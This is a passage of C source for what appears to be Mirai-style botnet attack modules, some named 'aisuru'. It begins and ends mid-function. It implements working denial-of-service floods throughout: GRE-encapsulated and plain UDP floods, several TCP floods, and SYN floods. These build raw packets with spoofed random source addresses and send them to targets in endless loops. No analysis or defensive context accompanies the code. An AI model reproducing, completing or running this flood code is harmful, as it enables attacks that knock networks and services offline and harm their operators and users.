    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct ethhdr *ethh;
        struct iphdr *greiph;
        struct udphdr *udph;
        uint32_t ent1, ent2, ent3;

        pkts[i] = calloc(1510, sizeof (char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        ethh = (struct ethhdr *)(greh + 1);
        greiph = (struct iphdr *)(ethh + 1);
        udph = (struct udphdr *)(greiph + 1);

        // IP header init
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        // GRE header init
        greh->protocol = htons(PROTO_GRE_TRANS_ETH); // Protocol is 2 bytes

        // Ethernet header init
        ethh->h_proto = htons(ETH_P_IP);

        // Encapsulated IP header init
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);

        // UDP header init
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct ethhdr *ethh = (struct ethhdr *)(greh + 1);
            struct iphdr *greiph = (struct iphdr *)(ethh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            uint32_t ent1, ent2, ent3;

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            ent1 = rand_next();
            ent2 = rand_next();
            ent3 = rand_next();
            util_memcpy(ethh->h_dest, (char *)&ent1, 4);
            util_memcpy(ethh->h_source, (char *)&ent2, 4);
            util_memcpy(ethh->h_dest + 4, (char *)&ent3, 2);
            util_memcpy(ethh->h_source + 4, (((char *)&ent3)) + 2, 2);

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcp_udp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }

#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
        break;
#endif
    }
}

void attack_udp_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));

    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);

    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));

        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

#define NONBLOCK(fd) fcntl(fd, F_SETFL, fcntl(fd, F_GETFL) | O_NONBLOCK)

void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;

        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = rand_next() & 0xffff;
        if (psh_fl)
            tcph->psh = TRUE;

        rand_str(payload, data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcp_udp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_tcp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    uint16_t size = 0;
    uint16_t port = 0;

    size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1); // Default size to 1 (random) if not specified
    port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 22);

    struct sockaddr_in addr;
    char *buf = (char *)malloc(size);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = targs[0].addr;

    memset(buf, 0, size);

    struct state
    {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    int clear = 0;

    for(clear = 0; clear < MAX_FDS; clear++)
    {
        states[clear].fd = -1;
        states[clear].state = 0;
        states[clear].timeout = 0;
    }

    while(1)
    {
        int i = 0;
        fd_set write_set;
        struct timeval timeout;
        int fds = 0;
        socklen_t err = 0;
        int err_len = sizeof(int);

        for(i = 0; i < MAX_FDS; i++)
        {
            switch(states[i].state)
            {
                case 0:
                    if((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        continue;
                    }
                    NONBLOCK(states[i].fd);
                    errno = 0;
                    if(connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                    {
                        close(states[i].fd);
                        states[i].timeout = 0;
                        continue;
                    }
                    states[i].state = 1;
                    states[i].timeout = time(NULL);
                    break;
                case 1:
                    FD_ZERO(&write_set);
                    FD_SET(states[i].fd, &write_set);

                    timeout.tv_usec = 10;
                    timeout.tv_sec = 0;

                    fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(fds == 1)
                    {
                        getsockopt(states[i].fd, SOL_SOCKET,SO_ERROR, &err, &err_len);

                        if(err)
                        {
                            close(states[i].fd);
                            states[i].state = 0;
                            states[i].timeout = 0;
                            continue;
                        }

                        states[i].state = 2;
                        continue;
                    }
                    else if(fds == -1)
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }

                    if(states[i].timeout + 5 < time(NULL))
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
                case 2:
                    if(size == 1)
                        size = 500 + rand() % 400; //we randomize between 500 and 900 each packet
                    else
                        size = size;

                    rand_str((unsigned char*)buf, size);

                    if(send(states[i].fd, buf, size, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
            }
        }
    }

    return;
}

int hex_to_bin(const char *hex, uint8_t *buf, size_t buf_size) {
    size_t hex_len = strlen(hex);
    
    // Check if the hex string length is even
    if (hex_len % 2 != 0) {
        return -1; // Invalid hex string
    }

    // Calculate the number of bytes needed
    size_t byte_count = hex_len / 2;

    // Check if the buffer is large enough
    if (byte_count > buf_size) {
        return -1; // Buffer too small
    }

    for (size_t i = 0; i < byte_count; i++) {
        // Convert each pair of hex digits to a byte
        sscanf(hex + 2 * i, "%2hhx", &buf[i]);
    }

    return byte_count; // Return the number of bytes written
}


void attack_tcp_socket_aisuru(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, max_fd = 0;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    int min_len = attack_get_opt_int(opts_len, opts, ATK_OPT_MIN_SIZE, 0);
    int max_len = attack_get_opt_int(opts_len, opts, ATK_OPT_MAX_SIZE, 1440); // MTU-safe
    uint8_t sleepr = attack_get_opt_int(opts_len, opts, ATK_OPT_SLEEPR, 0);
    char *payload_hex = attack_get_opt_str(opts_len, opts, ATK_OPT_PAYLOAD_ONE, NULL);
    uint8_t sleepc = attack_get_opt_int(opts_len, opts, ATK_OPT_SLEEPC, 0);

    // Clamp payload_size
    if (payload_size < min_len) payload_size = min_len;
    if (max_len && payload_size > max_len) payload_size = max_len;

    // Allocate buffer
    char *buf = malloc(max_len);
    if (!buf) {
#ifdef DEBUG
        printf("Failed to allocate buffer\n");
#endif
        return;
    }
    memset(buf, 0, max_len);

    // Parse hex payload if provided
    int payload_len = payload_size;
    if (payload_hex && hex_to_bin(payload_hex, buf, max_len) != -1) {
        payload_len = strlen(payload_hex) / 2;
        if (payload_len < min_len) payload_len = min_len;
        if (max_len && payload_len > max_len) payload_len = max_len;
    }

    struct state {
        int fd;
        int state;
        uint32_t timeout;
        struct sockaddr_in addr;
    } states[MAX_FDS];

    // Initialize states
    for (i = 0; i < MAX_FDS; i++) {
        states[i].fd = -1;
        states[i].state = 0;
        states[i].timeout = 0;
        states[i].addr.sin_family = AF_INET;
        states[i].addr.sin_port = (dport == 0xffff) ? htons(rand_next() & 0xffff) : htons(dport);
        states[i].addr.sin_addr.s_addr = (targs_len && targs[0].netmask < 32) ?
            htonl(ntohl(targs[0].addr) + (((uint32_t)rand_next()) >> targs[0].netmask)) :
            (targs_len ? targs[0].addr : INADDR_ANY);
    }

    while (1) {
        fd_set write_set;
        struct timeval timeout;
        int fds, err;
        socklen_t err_len = sizeof(int);

        FD_ZERO(&write_set);
        max_fd = 0;

        for (i = 0; i < MAX_FDS; i++) {
            switch (states[i].state) {
                case 0: // Open connection
                    if ((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
#ifdef DEBUG
                        printf("Socket creation failed: %s\n", strerror(errno));
#endif
                        continue;
                    }
                    NONBLOCK(states[i].fd);
                    errno = 0;
                    if (connect(states[i].fd, (struct sockaddr *)&states[i].addr, sizeof(struct sockaddr_in)) == -1 && errno != EINPROGRESS) {
#ifdef DEBUG
                        printf("Connect failed: %s\n", strerror(errno));
#endif
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                        continue;
                    }
                    states[i].state = 1;
                    states[i].timeout = time(NULL);
                    if (states[i].fd > max_fd) max_fd = states[i].fd;
                    if (sleepc) usleep(sleepc * 0); // Respect ATK_OPT_SLEEPC (ms)
                    break;
                case 1: // Check connection
                    FD_SET(states[i].fd, &write_set);
                    if (states[i].fd > max_fd) max_fd = states[i].fd;
                    break;
                case 2: // Send data
                    if (min_len && max_len) {
                        max_len = min_len + (rand() % (max_len - min_len + 1));
                    } else {
                        min_len = max_len; // Ensure payload_size is also an integer
                    }
                    if (send(states[i].fd, buf, min_len, MSG_NOSIGNAL) <= 0 && errno != EAGAIN) {
                        #ifdef DEBUG
                            printf("Send failed: %s\n", strerror(errno));
                        #endif
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                        continue;
                    }
                    if (sleepr) usleep(sleepr); // Respect ATK_OPT_SLEEPR (us)
                    break;
            }
        }

        if (max_fd == 0) {
            usleep(10000); // Avoid tight loop if no fds
            continue;
        }

        timeout.tv_sec = 0;
        timeout.tv_usec = 10000; // 10ms
        fds = select(max_fd + 1, NULL, &write_set, NULL, &timeout);
        if (fds == -1) {
#ifdef DEBUG
            printf("Select failed: %s\n", strerror(errno));
#endif
            continue;
        }

        for (i = 0; i < MAX_FDS; i++) {
            if (states[i].state != 1 || !FD_ISSET(states[i].fd, &write_set)) continue;
            err = 0;
            getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
            if (err) {
#ifdef DEBUG
                printf("Connection error: %s\n", strerror(err));
#endif
                close(states[i].fd);
                states[i].fd = -1;
                states[i].state = 0;
                states[i].timeout = 0;
                continue;
            }
            states[i].state = 2; // Connected, ready to send
        }

        for (i = 0; i < MAX_FDS; i++) {
            if (states[i].state != 0 && states[i].timeout + 5 < time(NULL)) {
#ifdef DEBUG
                printf("Timeout for fd %d\n", states[i].fd);
#endif
                close(states[i].fd);
                states[i].fd = -1;
                states[i].state = 0;
                states[i].timeout = 0;
            }
        }
    }

    // Cleanup
    for (i = 0; i < MAX_FDS; i++) {
        if (states[i].fd != -1) close(states[i].fd);
    }
    free(buf);
}

void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;\
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 64);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
        return;

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;

        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons((sport == 0xffff) ? (1024 + (rand_next() % 64511)) : sport);
        tcph->dest = htons((dport == 0xffff) ? (rand_next() % 65535) : dport);

        tcph->urg = rand() % 2;
        tcph->ack = 1;
        tcph->psh = rand() % 2;
        tcph->fin = rand() % 2;
        tcph->rst = rand() % 2;
        tcph->syn = 0;
        tcph->doff = 5;
        tcph->window = htons(1024 + (rand() % 4096));

        tcph->seq = htonl(rand_next());
        tcph->ack_seq = htonl(rand_next());

        if (data_rand)
            rand_str(payload, data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);

            iph->id = htons(rand_next() & 0xffff);
            iph->ttl = 32 + (rand() % 64);
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->seq = htonl(rand_next());
            tcph->ack_seq = htonl(rand_next());

            tcph->urg = rand() % 2;
            tcph->psh = rand() % 2;
            tcph->fin = rand() % 2;
            tcph->rst = rand() % 2;

            tcph->check = 0;
            tcph->check = checksum_tcp_udp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr) + data_len);

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, 0,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        usleep(10);
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;

        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;

        // TCP MSS
        *opts++ = PROTO_TCP_OPT_MSS;    // Kind
        *opts++ = 4;                    // Length
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);

        // TCP SACK permitted
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;

        // TCP timestamps
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);

        // TCP nop
        *opts++ = 1;

        // TCP window scale
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6; // 2^6 = 64, window size scale = 64
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            
            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcp_udp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_tcp_syn_aisuru(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t sleepr = attack_get_opt_int(opts_len, opts, ATK_OPT_SLEEPR, 0);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) return;
    i = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int));

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *tcp_opts;

        pkts[i] = calloc(128, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        tcp_opts = (uint8_t *)(tcph + 1);

        iph->version = 4; iph->ihl = 5; iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
        iph->id = htons(1); iph->ttl = 64; iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP; iph->saddr = LOCAL_ADDR; iph->daddr = targs[i].addr;

        tcph->source = htons(sport); tcph->dest = htons(dport);
        tcph->doff = 10; tcph->syn = 1;

        *tcp_opts++ = PROTO_TCP_OPT_MSS; *tcp_opts++ = 4;
        *((uint16_t *)tcp_opts) = htons(1400 + (rand_next() & 0x0f));
        tcp_opts += 2;
        // SACK, TS, and Window Scale options...
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (sport == 0xffff) tcph->source = htons(rand_next() & 0xffff);
            if (dport == 0xffff) tcph->dest = htons(rand_next() & 0xffff);

            iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
